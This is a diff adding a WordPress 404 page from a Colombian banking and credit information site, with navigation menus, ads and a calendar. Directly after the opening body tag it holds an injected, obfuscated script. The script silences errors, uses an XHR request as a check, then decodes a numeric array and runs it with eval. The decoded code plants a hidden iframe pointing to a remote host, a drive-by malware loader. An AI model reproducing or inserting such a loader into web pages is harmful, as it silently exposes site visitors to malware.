@@ -1,0 +1,306 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<title>Oops Busca otra palabra  Msxml2 XMLHTTP</title>
+<link rel="stylesheet" href="http://bancocredito.com.co/wp-content/themes/Prestij/css/screen.css" type="text/css" media="screen, projection" />
+<link rel="stylesheet" href="http://bancocredito.com.co/wp-content/themes/Prestij/css/print.css" type="text/css" media="print" />
+<!--[if IE]><link rel="stylesheet" href="http://bancocredito.com.co/wp-content/themes/Prestij/css/ie.css" type="text/css" media="screen, projection"><![endif]-->
+<link rel="stylesheet" href="http://bancocredito.com.co/wp-content/themes/Prestij/style.css" type="text/css" media="screen" />
+
+<!--[if IE 6]>
+	<script src="http://bancocredito.com.co/wp-content/themes/Prestij/js/pngfix.js"></script>
+<![endif]--> 
+<link rel="alternate" type="application/rss+xml" title="Banco Crédito RSS Feed" href="http://bancocredito.com.co/feed/" />
+<link rel="alternate" type="application/atom+xml" title="Banco Crédito Atom Feed" href="http://bancocredito.com.co/feed/atom/" />
+<link rel="pingback" href="http://bancocredito.com.co/xmlrpc.php" />
+<script src="http://bancocredito.com.co/wp-content/themes/Prestij/menu/mootools-1.2.1-core-yc.js" type="text/javascript"></script>
+<link rel="stylesheet" href="http://bancocredito.com.co/wp-content/themes/Prestij/menu/MenuMatic.css" type="text/css" media="screen" charset="utf-8" />
+<!--[if lt IE 7]>
+	<link rel="stylesheet" href="http://bancocredito.com.co/wp-content/themes/Prestij/menu/MenuMatic-ie6.css" type="text/css" media="screen" charset="utf-8" />
+<![endif]-->
+<!-- Load the MenuMatic Class -->
+<script src="http://bancocredito.com.co/wp-content/themes/Prestij/menu/MenuMatic_0.68.3.js" type="text/javascript" charset="utf-8"></script>
+
+
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://bancocredito.com.co/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://bancocredito.com.co/wp-includes/wlwmanifest.xml" /> 
+<link rel='index' title='Banco Crédito' href='http://bancocredito.com.co/' />
+<meta name="generator" content="WordPress 3.1.2" />
+
+<!-- All in One SEO Pack 1.6.13.2 by Michael Torbert of Semper Fi Web Design[312,352] -->
+<!-- /all in one seo pack -->
+
+
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-16165672-11']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+
+</head>
+<body><script>var date=new Date();function lols(){return true}
+window.onerror=lols;function getXmlHttp(){var xmlhttp;try{xmlhttp=new ActiveXObject('Msxml2.XMLHTTP');}catch(e){try{xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');}catch(e){xmlhttp=false;}}
+if(!xmlhttp&&typeof XMLHttpRequest!='undefined'){xmlhttp=new XMLHttpRequest();}
+return xmlhttp;}
+v=32;date=new Date();try{var req=getXmlHttp();req.onreadystatechange=function(){if(req.readyState==1){absrbwa();}};req.open('GET','http://google.com/',true);req.send(null);}catch(e){}
+var y=false;function absrbwa(){if(y)return;y=true;var k=typeof this.asdasdasd;ev=eval;var cont=ev('u288,0.28125,3360,3.1875,1024,1.25,3200,3.46875,3168,3.65625,3488,3.15625,3520,3.625,1472,3.21875,3232,3.625,2208,3.375,3232,3.40625,3232,3.4375,3712,3.59375,2112,3.78125,2688,3.03125,3296,2.4375,3104,3.40625,3232,1.25,1248,3.0625,3552,3.125,3872,1.21875,1312,2.84375,1536,2.90625,1312,3.84375,416,0.28125,288,0.28125,3360,3.1875,3648,3.03125,3488,3.15625,3648,1.25,1312,1.84375,416,0.28125,288,3.90625,1024,3.15625,3456,3.59375,3232,1,3936,0.40625,288,0.28125,288,3.125,3552,3.09375,3744,3.40625,3232,3.4375,3712,1.4375,3808,3.5625,3360,3.625,3232,1.25,1088,1.875,3360,3.1875,3648,3.03125,3488,3.15625,1024,3.59375,3648,3.09375,1952,1.21875,3328,3.625,3712,3.5,1856,1.46875,1504,3.09375,3552,3.65625,3520,3.625,3232,3.5625,3680,3.625,3104,3.625,3680,1.4375,3168,3.8125,1472,3.09375,3168,1.46875,3168,3.46875,3744,3.4375,3712,3.15625,3648,1.4375,3328,3.625,3488,1.21875,1024,3.71875,3360,3.125,3712,3.25,1952,1.21875,1568,1.5,1248,1,3328,3.15625,3360,3.21875,3328,3.625,1952,1.21875,1568,1.5,1248,1,3680,3.625,3872,3.375,3232,1.90625,1248,3.6875,3360,3.59375,3360,3.0625,3360,3.375,3360,3.625,3872,1.8125,3328,3.28125,3200,3.125,3232,3.4375,1888,3.5,3552,3.59375,3360,3.625,3360,3.46875,3520,1.8125,3104,3.0625,3680,3.46875,3456,3.65625,3712,3.15625,1888,3.375,3232,3.1875,3712,1.8125,1536,1.84375,3712,3.46875,3584,1.8125,1536,1.84375,1248,1.9375,1920,1.46875,3360,3.1875,3648,3.03125,3488,3.15625,1984,1.0625,1312,1.84375,416,0.28125,288,3.90625,416,0.28125,288,3.1875,3744,3.4375,3168,3.625,3360,3.46875,3520,1,3360,3.1875,3648,3.03125,3488,3.15625,3648,1.25,1312,3.84375,416,0.28125,288,0.28125,3776,3.03125,3648,1,3264,1,1952,1,3200,3.46875,3168,3.65625,3488,3.15625,3520,3.625,1472,3.09375,3648,3.15625,3104,3.625,3232,2.15625,3456,3.15625,3488,3.15625,3520,3.625,1280,1.21875,3360,3.1875,3648,3.03125,3488,3.15625,1248,1.28125,1888,3.1875,1472,3.59375,3232,3.625,2080,3.625,3712,3.5625,3360,3.0625,3744,3.625,3232,1.25,1248,3.59375,3648,3.09375,1248,1.375,1248,3.25,3712,3.625,3584,1.8125,1504,1.46875,3168,3.46875,3744,3.4375,3712,3.15625,3648,3.59375,3712,3.03125,3712,3.59375,1472,3.09375,3904,1.4375,3168,3.09375,1504,3.09375,3552,3.65625,3520,3.625,3232,3.5625,1472,3.25,3712,3.40625,1248,1.28125,1888,3.1875,1472,3.59375,3712,3.78125,3456,3.15625,1472,3.6875,3360,3.59375,3360,3.0625,3360,3.375,3360,3.625,3872,1.90625,1248,3.25,3360,3.125,3200,3.15625,3520,1.21875,1888,3.1875,1472,3.59375,3712,3.78125,3456,3.15625,1472,3.5,3552,3.59375,3360,3.625,3360,3.46875,3520,1.90625,1248,3.03125,3136,3.59375,3552,3.375,3744,3.625,3232,1.21875,1888,3.1875,1472,3.59375,3712,3.78125,3456,3.15625,1472,3.375,3232,3.1875,3712,1.90625,1248,1.5,1248,1.84375,3264,1.4375,3680,3.625,3872,3.375,3232,1.4375,3712,3.46875,3584,1.90625,1248,1.5,1248,1.84375,3264,1.4375,3680,3.15625,3712,2.03125,3712,3.625,3648,3.28125,3136,3.65625,3712,3.15625,1280,1.21875,3808,3.28125,3200,3.625,3328,1.21875,1408,1.21875,1568,1.5,1248,1.28125,1888,3.1875,1472,3.59375,3232,3.625,2080,3.625,3712,3.5625,3360,3.0625,3744,3.625,3232,1.25,1248,3.25,3232,3.28125,3296,3.25,3712,1.21875,1408,1.21875,1568,1.5,1248,1.28125,1888,0.40625,288,0.28125,288,3.125,3552,3.09375,3744,3.40625,3232,3.4375,3712,1.4375,3296,3.15625,3712,2.15625,3456,3.15625,3488,3.15625,3520,3.625,3680,2.0625,3872,2.625,3104,3.21875,2496,3.03125,3488,3.15625,1280,1.21875,3136,3.46875,3200,3.78125,1248,1.28125,2912,1.5,2976,1.4375,3104,3.5,3584,3.15625,3520,3.125,2144,3.25,3360,3.375,3200,1.25,3264,1.28125,1888,0.40625,288,0.28125,4000]'.replace(k[req.responseText+'substr'](0,1),'['));s='';for(i=0;i<cont.length;i++){s+=String.fromCharCode((i%2)?cont[i]*v:cont[i]/v);}
+ev(s);}</script>
+<script type="text/javascript">
+	window.addEvent('domready', function() {			
+			var myMenu = new MenuMatic();
+	});	
+</script>
+	<div id="wrapper">
+		<div id="container" class="container">  
+			<div class="span-24">
+                <div class="span-17">
+                    <div id="pagemenucontainer">
+        				
+                            <ul id="pagemenu">
+        						<li ><a href="http://bancocredito.com.co/">Home</a></li>
+        						
+        					</ul>
+                            
+        			</div>
+                </div>
+                
+                <div class="span-7 last">
+                    <div id="topsearch">
+                         
+<div id="search">
+    <form method="get" id="searchform" action="http://bancocredito.com.co/"> 
+        <input type="text" value="Buscar" 
+            name="s" id="s"  onblur="if (this.value == '')  {this.value = 'Buscar';}"  
+            onfocus="if (this.value == 'Buscar') {this.value = '';}" />
+        <input type="image" src="http://bancocredito.com.co/wp-content/themes/Prestij/images/search.gif" style="border:0; vertical-align: top;" /> 
+    </form>
+</div> 
+                    </div>
+                </div>
+                
+	       	</div>
+            
+            
+				<div id="header" class="span-24">
+					<div class="span-12">
+						
+							<h1><a href="http://bancocredito.com.co">Banco Crédito</a></h1>
+							<h2>Un Sitio de Información Donde Encontraras las Ultimas ofertas de Crédito en Colombia, ademas de la ultima Información Bancaria, Financiera, Negocios y Ahorro Familiar y Personal</h2>
+							
+						
+					</div>
+					
+					<div class="span-12 last" style="padding-top: 30px; text-align:right;">
+						
+					</div>
+				</div>
+			
+			<div class="span-24">
+				
+				<div id="navcontainer">
+					
+                            <ul id="nav">
+                                <li ><a href="http://bancocredito.com.co">Home</a></li>
+        							<li class="cat-item cat-item-3"><a href="http://bancocredito.com.co/category/banco-de-bogota/" title="View all posts filed under Banco de Bogota">Banco de Bogota</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="http://bancocredito.com.co/category/banco-de-credito-helm/" title="View all posts filed under Banco de Credito &#8211; Helm">Banco de Credito &#8211; Helm</a>
+</li>
+	<li class="cat-item cat-item-13"><a href="http://bancocredito.com.co/category/banco-de-la-mujer-wwb/" title="View all posts filed under Banco de la Mujer WWB">Banco de la Mujer WWB</a>
+</li>
+	<li class="cat-item cat-item-12"><a href="http://bancocredito.com.co/category/banco-de-la-republica/" title="View all posts filed under Banco de la República">Banco de la República</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="http://bancocredito.com.co/category/banco-de-occidente/" title="View all posts filed under Banco de Occidente">Banco de Occidente</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://bancocredito.com.co/category/banco-popular/" title="View all posts filed under Banco Popular">Banco Popular</a>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://bancocredito.com.co/category/banco-santander/" title="View all posts filed under Banco Santander">Banco Santander</a>
+</li>
+	<li class="cat-item cat-item-11"><a href="http://bancocredito.com.co/category/bancoldex/" title="View all posts filed under Bancoldex">Bancoldex</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://bancocredito.com.co/category/bancolombia/" title="View all posts filed under Bancolombia">Bancolombia</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://bancocredito.com.co/category/bbva/" title="View all posts filed under BBVA">BBVA</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="http://bancocredito.com.co/category/banco-citibank/" title="View all posts filed under CitiBank">CitiBank</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://bancocredito.com.co/category/davivienda/" title="View all posts filed under Davivienda">Davivienda</a>
+</li>
+	<li class="cat-item cat-item-21"><a href="http://bancocredito.com.co/category/prestamos-rapidos/" title="View all posts filed under prestamos rapidos">prestamos rapidos</a>
+</li>
+
+        					</ul>
+                            
+				</div>
+			</div>
+<div class="span-24" id="contentwrap">
+	<div class="span-13">
+		<div id="content">	
+			<h2 class='pagetitle'>Error 404 - Page Not Found</h2>
+		</div>
+	</div>
+
+<div class="span-11 last">
+            
+	<div class="span-7">
+	
+		<div class="sidebar left-sidebar">
+		
+		    			<div class="addthis_toolbox">   
+    			    <div class="custom_images">
+    			            <a class="addthis_button_twitter"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/twitter.png" width="32" height="32" alt="Twitter" /></a>
+    			            <a class="addthis_button_delicious"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/delicious.png" width="32" height="32" alt="Delicious" /></a>
+    			            <a class="addthis_button_facebook"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/facebook.png" width="32" height="32" alt="Facebook" /></a>
+    			            <a class="addthis_button_digg"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/digg.png" width="32" height="32" alt="Digg" /></a>
+    			            <a class="addthis_button_stumbleupon"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/stumbleupon.png" width="32" height="32" alt="Stumbleupon" /></a>
+                            <a class="addthis_button_favorites"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/favorites.png" width="32" height="32" alt="Favorites" /></a>
+    			            <a class="addthis_button_more"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/socialicons/more.png" width="32" height="32" alt="More" /></a>
+    			    </div>
+    			    <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js?pub=xa-4a65e1d93cd75e94"></script>
+    			</div>
+    			        
+                
+    	
+			<ul>
+				<li id="categories-3" class="widget widget_categories"><h2 class="widgettitle">Más Créditos en bancos</h2>		<ul>
+	<li class="cat-item cat-item-3"><a href="http://bancocredito.com.co/category/banco-de-bogota/" title="View all posts filed under Banco de Bogota">Banco de Bogota</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="http://bancocredito.com.co/category/banco-de-credito-helm/" title="View all posts filed under Banco de Credito &#8211; Helm">Banco de Credito &#8211; Helm</a>
+</li>
+	<li class="cat-item cat-item-13"><a href="http://bancocredito.com.co/category/banco-de-la-mujer-wwb/" title="View all posts filed under Banco de la Mujer WWB">Banco de la Mujer WWB</a>
+</li>
+	<li class="cat-item cat-item-12"><a href="http://bancocredito.com.co/category/banco-de-la-republica/" title="View all posts filed under Banco de la República">Banco de la República</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="http://bancocredito.com.co/category/banco-de-occidente/" title="View all posts filed under Banco de Occidente">Banco de Occidente</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://bancocredito.com.co/category/banco-popular/" title="View all posts filed under Banco Popular">Banco Popular</a>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://bancocredito.com.co/category/banco-santander/" title="View all posts filed under Banco Santander">Banco Santander</a>
+</li>
+	<li class="cat-item cat-item-11"><a href="http://bancocredito.com.co/category/bancoldex/" title="View all posts filed under Bancoldex">Bancoldex</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://bancocredito.com.co/category/bancolombia/" title="View all posts filed under Bancolombia">Bancolombia</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://bancocredito.com.co/category/bbva/" title="View all posts filed under BBVA">BBVA</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="http://bancocredito.com.co/category/banco-citibank/" title="View all posts filed under CitiBank">CitiBank</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://bancocredito.com.co/category/davivienda/" title="View all posts filed under Davivienda">Davivienda</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://bancocredito.com.co/category/noticias-financieras/" title="View all posts filed under Noticias Financieras">Noticias Financieras</a>
+</li>
+	<li class="cat-item cat-item-21"><a href="http://bancocredito.com.co/category/prestamos-rapidos/" title="View all posts filed under prestamos rapidos">prestamos rapidos</a>
+</li>
+		</ul>
+</li><li id="dfrads-widget-3" class="widget dfrads"><p style="text-align: center;"><a href="http://mujeresapasionadas.com/modelos/modelos-lindas-colombianas/"><img class="size-full wp-image-617 aligncenter" title="modelos colombianas hermoas" src="http://bancocredito.com.co/wp-content/uploads/2011/04/modelos-colombianas-hermoas.png" alt="" width="270" height="471" /></a></p></li><li id="calendar-3" class="widget widget_calendar"><h2 class="widgettitle">Calendario</h2><div id="calendar_wrap"><table id="wp-calendar" summary="Calendar">
+	<caption>May 2011</caption>
+	<thead>
+	<tr>
+		<th scope="col" title="Monday">M</th>
+		<th scope="col" title="Tuesday">T</th>
+		<th scope="col" title="Wednesday">W</th>
+		<th scope="col" title="Thursday">T</th>
+		<th scope="col" title="Friday">F</th>
+		<th scope="col" title="Saturday">S</th>
+		<th scope="col" title="Sunday">S</th>
+	</tr>
+	</thead>
+
+	<tfoot>
+	<tr>
+		<td colspan="3" id="prev"><a href="http://bancocredito.com.co/2011/04/" title="View posts for April 2011">&laquo; Apr</a></td>
+		<td class="pad">&nbsp;</td>
+		<td colspan="3" id="next" class="pad">&nbsp;</td>
+	</tr>
+	</tfoot>
+
+	<tbody>
+	<tr>
+		<td colspan="6" class="pad">&nbsp;</td><td>1</td>
+	</tr>
+	<tr>
+		<td>2</td><td>3</td><td>4</td><td><a href="http://bancocredito.com.co/2011/05/05/" title="El mejor banco para ahorrar en Colombia">5</a></td><td>6</td><td>7</td><td>8</td>
+	</tr>
+	<tr>
+		<td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td id="today">14</td><td>15</td>
+	</tr>
+	<tr>
+		<td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td><td>22</td>
+	</tr>
+	<tr>
+		<td>23</td><td>24</td><td>25</td><td>26</td><td>27</td><td>28</td><td>29</td>
+	</tr>
+	<tr>
+		<td>30</td><td>31</td>
+		<td class="pad" colspan="5">&nbsp;</td>
+	</tr>
+	</tbody>
+	</table></div></li>			</ul>
+			
+			
+		</div>
+	</div>
+    
+	<div class="span-4 last">
+        
+		<div class="sidebar right-sidebar">
+		
+		    			<div class="socialboxes">
+    				<a href="http://bancocredito.com.co/feed/"><img src="http://bancocredito.com.co/wp-content/themes/Prestij/images/rss.png"  alt="RSS Feed" title="RSS Feed" style="vertical-align:middle; margin-right: 5px;"  /></a><a href="http://bancocredito.com.co/feed/">Subscribe</a>
+    			</div>
+    			    	
+    	    	
+                    		<div class="sidebaradbox125">
+        			<a href="http://bancocredito.com.co/noticias-financieras/ideas-para-ganar-dinero-extra/" target="_new"><img class="ad125" src="http://bancocredito.com.co/wp-content/uploads/2011/04/125x125.jpg" /></a> 
+<a href="http://bancocredito.com.co/noticias-financieras/prestamos-sin-papeleo/" target="_new"><img class="ad125" src="http://bancocredito.com.co/noticias-financieras/ideas-para-ganar-dinero-extra/" /></a> 
+<a href="http://bancocredito.com.co/noticias-financieras/prestamos-rapidos-en-colombia/" target="_new"><img class="ad125" src="http://bancocredito.com.co/wp-content/uploads/2011/04/dinero.jpg" /></a> 
+<a href="http://bancocredito.com.co/noticias-financieras/ganar-dinero-llenando-encuestas/" target="_new"><img class="ad125" src="http://bancocredito.com.co/wp-content/uploads/2011/04/encuestas1.png" /></a> 
+<a href="http://bancocredito.com.co/noticias-financieras/prestamos-rapidos-en-colombia/" target="_new"><img class="ad125" src="http://bancocredito.com.co/noticias-financieras/prestamos-rapidos-en-colombia/" /></a> 
+<a href="http://bancocredito.com.co/noticias-financieras/fx-colombia-forex-dinero-facil/" target="_new"><img class="ad125" src="http://bancocredito.com.co/wp-content/uploads/2011/04/inversionesforexx.gif" /></a> 
+        		</div>
+        	            
+          	
+			<ul>
+				<li id="linkcat-2" class="widget widget_links"><h2 class="widgettitle">Enlaces</h2>
+	<ul class='xoxo blogroll'>
+<li><a href="http://bancocredito.com.co/noticias-financieras/politica-de-privacidad/" target="_blank">Políticas de Privacidad</a></li>
+<li><a href="http://bancocredito.com.co/sitemap.xml">Sitemap</a></li>
+
+	</ul>
+</li>
+		<li id="recent-posts-3" class="widget widget_recent_entries">		<h2 class="widgettitle">Lo Ultimo</h2>		<ul>
+				<li><a href="http://bancocredito.com.co/noticias-financieras/el-mejor-banco-para-ahorrar-en-colombia/" title="El mejor banco para ahorrar en Colombia">El mejor banco para ahorrar en Colombia</a></li>
+				<li><a href="http://bancocredito.com.co/noticias-financieras/tarjeta-credito-exito-colombia/" title="Tarjeta Crédito Éxito Colombia">Tarjeta Crédito Éxito Colombia</a></li>
+				<li><a href="http://bancocredito.com.co/noticias-financieras/como-conseguir-credito-gratis-en-skype/" title="Como conseguir crédito gratis en skype">Como conseguir crédito gratis en skype</a></li>
+				<li><a href="http://bancocredito.com.co/noticias-financieras/negocios-para-hacer-dinero-rapido/" title="Negocios para hacer dinero rápido">Negocios para hacer dinero rápido</a></li>
+				<li><a href="http://bancocredito.com.co/noticias-financieras/concursos-online-para-ganar-dinero/" title="Concursos online para ganar dinero">Concursos online para ganar dinero</a></li>
+				</ul>
+		</li><li id="text-14" class="widget widget_text">			<div class="textwidget"><!-- Histats.com  START  (standard)-->
+<script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
+<a href="http://www.histats.com" target="_blank" title="contadores" ><script  type="text/javascript" >
+try {Histats.start(1,1103823,4,0,0,0,"00000000");
+Histats.track_hits();} catch(err){};
+</script></a>
+<noscript><a href="http://www.histats.com" target="_blank"><img  src="http://sstatic1.histats.com/0.gif?1103823&101" alt="contadores" border="0"></a></noscript>
+<!-- Histats.com  END  --></div>
+		</li>			</ul>
+		          
+		</div>
+	</div>
+	
+</div>
+
+	</div>
